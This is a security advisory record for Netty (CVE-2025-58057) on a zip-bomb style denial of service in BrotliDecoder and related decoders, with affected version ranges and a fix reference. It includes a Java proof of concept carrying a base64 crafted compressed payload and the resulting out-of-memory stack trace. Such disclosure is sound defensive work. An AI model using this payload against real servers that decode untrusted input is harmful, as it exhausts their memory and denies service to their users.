{
  "affected": [
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-3p8m-j85q-pgmj/GHSA-3p8m-j85q-pgmj.json"
      },
      "package": {
        "ecosystem": "Maven",
        "name": "io.netty:netty-codec-compression",
        "purl": "pkg:maven/io.netty/netty-codec-compression"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "4.2.0.Alpha1"
            },
            {
              "fixed": "4.2.5.Final"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "4.2.0.Alpha3",
        "4.2.0.Alpha4",
        "4.2.0.Alpha5",
        "4.2.0.Beta1",
        "4.2.0.Final",
        "4.2.0.RC1",
        "4.2.0.RC2",
        "4.2.0.RC3",
        "4.2.0.RC4",
        "4.2.1.Final",
        "4.2.2.Final",
        "4.2.3.Final",
        "4.2.4.Final"
      ]
    },
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-3p8m-j85q-pgmj/GHSA-3p8m-j85q-pgmj.json"
      },
      "package": {
        "ecosystem": "Maven",
        "name": "io.netty:netty-codec",
        "purl": "pkg:maven/io.netty/netty-codec"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "4.1.125.Final"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "4.0.0.Alpha1",
        "4.0.0.Alpha2",
        "4.0.0.Alpha3",
        "4.0.0.Alpha4",
        "4.0.0.Alpha5",
        "4.0.0.Alpha6",
        "4.0.0.Alpha7",
        "4.0.0.Alpha8",
        "4.0.0.Beta1",
        "4.0.0.Beta2",
        "4.0.0.Beta3",
        "4.0.0.CR1",
        "4.0.0.CR2",
        "4.0.0.CR3",
        "4.0.0.CR4",
        "4.0.0.CR5",
        "4.0.0.CR6",
        "4.0.0.CR7",
        "4.0.0.CR8",
        "4.0.0.CR9",
        "4.0.0.Final",
        "4.0.1.Final",
        "4.0.10.Final",
        "4.0.11.Final",
        "4.0.12.Final",
        "4.0.13.Final",
        "4.0.14.Beta1",
        "4.0.14.Final",
        "4.0.15.Final",
        "4.0.16.Final",
        "4.0.17.Final",
        "4.0.18.Final",
        "4.0.19.Final",
        "4.0.2.Final",
        "4.0.20.Final",
        "4.0.21.Final",
        "4.0.22.Final",
        "4.0.23.Final",
        "4.0.24.Final",
        "4.0.25.Final",
        "4.0.26.Final",
        "4.0.27.Final",
        "4.0.28.Final",
        "4.0.29.Final",
        "4.0.3.Final",
        "4.0.30.Final",
        "4.0.31.Final",
        "4.0.32.Final",
        "4.0.33.Final",
        "4.0.34.Final",
        "4.0.35.Final",
        "4.0.36.Final",
        "4.0.37.Final",
        "4.0.38.Final",
        "4.0.39.Final",
        "4.0.4.Final",
        "4.0.40.Final",
        "4.0.41.Final",
        "4.0.42.Final",
        "4.0.43.Final",
        "4.0.44.Final",
        "4.0.45.Final",
        "4.0.46.Final",
        "4.0.47.Final",
        "4.0.48.Final",
        "4.0.49.Final",
        "4.0.5.Final",
        "4.0.50.Final",
        "4.0.51.Final",
        "4.0.52.Final",
        "4.0.53.Final",
        "4.0.54.Final",
        "4.0.55.Final",
        "4.0.56.Final",
        "4.0.6.Final",
        "4.0.7.Final",
        "4.0.8.Final",
        "4.0.9.Final",
        "4.1.0.Beta1",
        "4.1.0.Beta2",
        "4.1.0.Beta3",
        "4.1.0.Beta4",
        "4.1.0.Beta5",
        "4.1.0.Beta6",
        "4.1.0.Beta7",
        "4.1.0.Beta8",
        "4.1.0.CR1",
        "4.1.0.CR2",
        "4.1.0.CR3",
        "4.1.0.CR4",
        "4.1.0.CR5",
        "4.1.0.CR6",
        "4.1.0.CR7",
        "4.1.0.Final",
        "4.1.1.Final",
        "4.1.10.Final",
        "4.1.100.Final",
        "4.1.101.Final",
        "4.1.102.Final",
        "4.1.103.Final",
        "4.1.104.Final",
        "4.1.105.Final",
        "4.1.106.Final",
        "4.1.107.Final",
        "4.1.108.Final",
        "4.1.109.Final",
        "4.1.11.Final",
        "4.1.110.Final",
        "4.1.111.Final",
        "4.1.112.Final",
        "4.1.113.Final",
        "4.1.114.Final",
        "4.1.115.Final",
        "4.1.116.Final",
        "4.1.117.Final",
        "4.1.118.Final",
        "4.1.119.Final",
        "4.1.12.Final",
        "4.1.120.Final",
        "4.1.121.Final",
        "4.1.122.Final",
        "4.1.123.Final",
        "4.1.124.Final",
        "4.1.13.Final",
        "4.1.14.Final",
        "4.1.15.Final",
        "4.1.16.Final",
        "4.1.17.Final",
        "4.1.18.Final",
        "4.1.19.Final",
        "4.1.2.Final",
        "4.1.20.Final",
        "4.1.21.Final",
        "4.1.22.Final",
        "4.1.23.Final",
        "4.1.24.Final",
        "4.1.25.Final",
        "4.1.26.Final",
        "4.1.27.Final",
        "4.1.28.Final",
        "4.1.29.Final",
        "4.1.3.Final",
        "4.1.30.Final",
        "4.1.31.Final",
        "4.1.32.Final",
        "4.1.33.Final",
        "4.1.34.Final",
        "4.1.35.Final",
        "4.1.36.Final",
        "4.1.37.Final",
        "4.1.38.Final",
        "4.1.39.Final",
        "4.1.4.Final",
        "4.1.40.Final",
        "4.1.41.Final",
        "4.1.42.Final",
        "4.1.43.Final",
        "4.1.44.Final",
        "4.1.45.Final",
        "4.1.46.Final",
        "4.1.47.Final",
        "4.1.48.Final",
        "4.1.49.Final",
        "4.1.5.Final",
        "4.1.50.Final",
        "4.1.51.Final",
        "4.1.52.Final",
        "4.1.53.Final",
        "4.1.54.Final",
        "4.1.55.Final",
        "4.1.56.Final",
        "4.1.57.Final",
        "4.1.58.Final",
        "4.1.59.Final",
        "4.1.6.Final",
        "4.1.60.Final",
        "4.1.61.Final",
        "4.1.62.Final",
        "4.1.63.Final",
        "4.1.64.Final",
        "4.1.65.Final",
        "4.1.66.Final",
        "4.1.67.Final",
        "4.1.68.Final",
        "4.1.69.Final",
        "4.1.7.Final",
        "4.1.70.Final",
        "4.1.71.Final",
        "4.1.72.Final",
        "4.1.73.Final",
        "4.1.74.Final",
        "4.1.75.Final",
        "4.1.76.Final",
        "4.1.77.Final",
        "4.1.78.Final",
        "4.1.79.Final",
        "4.1.8.Final",
        "4.1.80.Final",
        "4.1.81.Final",
        "4.1.82.Final",
        "4.1.83.Final",
        "4.1.84.Final",
        "4.1.85.Final",
        "4.1.86.Final",
        "4.1.87.Final",
        "4.1.88.Final",
        "4.1.89.Final",
        "4.1.9.Final",
        "4.1.90.Final",
        "4.1.91.Final",
        "4.1.92.Final",
        "4.1.93.Final",
        "4.1.94.Final",
        "4.1.95.Final",
        "4.1.96.Final",
        "4.1.97.Final",
        "4.1.98.Final",
        "4.1.99.Final"
      ]
    }
  ],
  "aliases": [
    "CVE-2025-58057"
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-409"
    ],
    "github_reviewed": true,
    "github_reviewed_at": "2025-09-03T18:00:55Z",
    "nvd_published_at": null,
    "severity": "MODERATE"
  },
  "details": "### Summary\n\nWith specially crafted input, `BrotliDecoder` and some other decompressing decoders will allocate a large number of reachable byte buffers, which can lead to denial of service.\n\n### Details\n\n`BrotliDecoder.decompress` has no limit in how often it calls `pull`, decompressing data 64K bytes at a time. The buffers are saved in the output list, and remain reachable until OOM is hit. This is basically a zip bomb.\n\nTested on 4.1.118, but there were no changes to the decoder since.\n\n### PoC\n\nRun this test case with `-Xmx1G`:\n\n```java\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.embedded.EmbeddedChannel;\n\nimport java.util.Base64;\n\npublic class T {\n    public static void main(String[] args) {\n        EmbeddedChannel channel = new EmbeddedChannel(new BrotliDecoder());\n        channel.writeInbound(Unpooled.wrappedBuffer(Base64.getDecoder().decode(\"aPpxD1tETigSAGj6cQ8vRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROMBIAEgIaHwBETlQQVFcXlgA=\")));\n    }\n}\n```\n\nError:\n\n```\nException in thread \"main\" java.lang.OutOfMemoryError: Cannot reserve 4194304 bytes of direct buffer memory (allocated: 1069580289, limit: 1073741824)\n\tat java.base/java.nio.Bits.reserveMemory(Bits.java:178)\n\tat java.base/java.nio.DirectByteBuffer.<init>(DirectByteBuffer.java:121)\n\tat java.base/java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:332)\n\tat io.netty.buffer.PoolArena$DirectArena.allocateDirect(PoolArena.java:718)\n\tat io.netty.buffer.PoolArena$DirectArena.newChunk(PoolArena.java:693)\n\tat io.netty.buffer.PoolArena.allocateNormal(PoolArena.java:213)\n\tat io.netty.buffer.PoolArena.tcacheAllocateNormal(PoolArena.java:195)\n\tat io.netty.buffer.PoolArena.allocate(PoolArena.java:137)\n\tat io.netty.buffer.PoolArena.allocate(PoolArena.java:127)\n\tat io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(PooledByteBufAllocator.java:403)\n\tat io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:188)\n\tat io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:179)\n\tat io.netty.buffer.AbstractByteBufAllocator.buffer(AbstractByteBufAllocator.java:116)\n\tat io.netty.handler.codec.compression.BrotliDecoder.pull(BrotliDecoder.java:70)\n\tat io.netty.handler.codec.compression.BrotliDecoder.decompress(BrotliDecoder.java:101)\n\tat io.netty.handler.codec.compression.BrotliDecoder.decode(BrotliDecoder.java:137)\n\tat io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:530)\n\tat io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:469)\n\tat io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:290)\n\tat io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:444)\n\tat io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)\n\tat io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)\n\tat io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1357)\n\tat io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)\n\tat io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)\n\tat io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:868)\n\tat io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:348)\n\tat io.netty.handler.codec.compression.T.main(T.java:11)\n```\n\n### Impact\n\nDoS for anyone using `BrotliDecoder` on untrusted input.",
  "id": "GHSA-3p8m-j85q-pgmj",
  "modified": "2025-09-03T18:12:20.645412Z",
  "published": "2025-09-03T18:00:55Z",
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/netty/netty/security/advisories/GHSA-3p8m-j85q-pgmj"
    },
    {
      "type": "WEB",
      "url": "https://github.com/netty/netty/commit/9d804c54ce962408ae6418255a83a13924f7145d"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/netty/netty"
    }
  ],
  "schema_version": "1.7.3",
  "severity": [
    {
      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
      "type": "CVSS_V4"
    }
  ],
  "summary": "Netty's decoders vulnerable to DoS via zip bomb style attack"
}